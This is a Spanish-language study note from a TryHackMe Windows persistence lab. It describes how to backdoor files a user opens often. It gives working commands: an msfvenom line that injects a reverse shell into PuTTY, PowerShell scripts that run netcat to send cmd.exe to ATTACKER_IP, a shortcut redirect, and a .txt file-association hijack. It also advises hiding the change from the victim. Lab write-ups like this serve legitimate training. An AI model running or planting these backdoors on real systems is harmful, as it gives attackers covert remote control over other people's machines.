---
tags: [red-team, persistence, windows, backdoor]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Tampering With Unprivileged Accounts]]"
  - "[[Logon Triggered Persistence]]"
---
Modificar archivos con los que el usuario interactúa regularmente para plantar backdoors que se ejecuten al accederlos, sin alterar su funcionamiento visible.

---

## Executable Files

Si encontramos un ejecutable que el usuario usa frecuentemente (ej: PuTTY en el escritorio), podemos inyectarle un payload con `msfvenom`:

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

> [!info] El flag `-k` ejecuta el payload en un thread separado, manteniendo el funcionamiento normal del binario.

---

## Shortcut Files

En lugar de modificar el ejecutable, modificar el **acceso directo** para que apunte a un script intermedio.

### Proceso

1. Crear un script PowerShell en una ubicación oculta (ej: `C:\Windows\System32\backdoor.ps1`):

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

2. Modificar el target del shortcut:

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

> [!warning] Asegurarse de restaurar el ícono del shortcut al ejecutable original para no levantar sospechas.

3. Listener en la máquina atacante:

```shell
nc -lvp 4445
```

---

## Hijacking File Associations

Modificar qué programa ejecuta Windows al abrir un tipo de archivo específico.

Las asociaciones se guardan en el registro bajo `HKLM\Software\Classes\`.

### Ejemplo con archivos .txt

1. `.txt` está asociado al ProgID `txtfile`
2. El comando de apertura está en: `HKLM\Software\Classes\txtfile\shell\open\command`
3. Valor por defecto: `%SystemRoot%\system32\NOTEPAD.EXE %1`

### Proceso

1. Crear `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

> [!tip] `$args[0]` recibe el nombre del archivo que el usuario intentó abrir (pasado como `%1`).

2. Modificar la clave de registro para ejecutar el backdoor en ventana oculta al abrir `.txt`.

3. Al abrir cualquier `.txt`, se obtiene una reverse shell con los privilegios del usuario.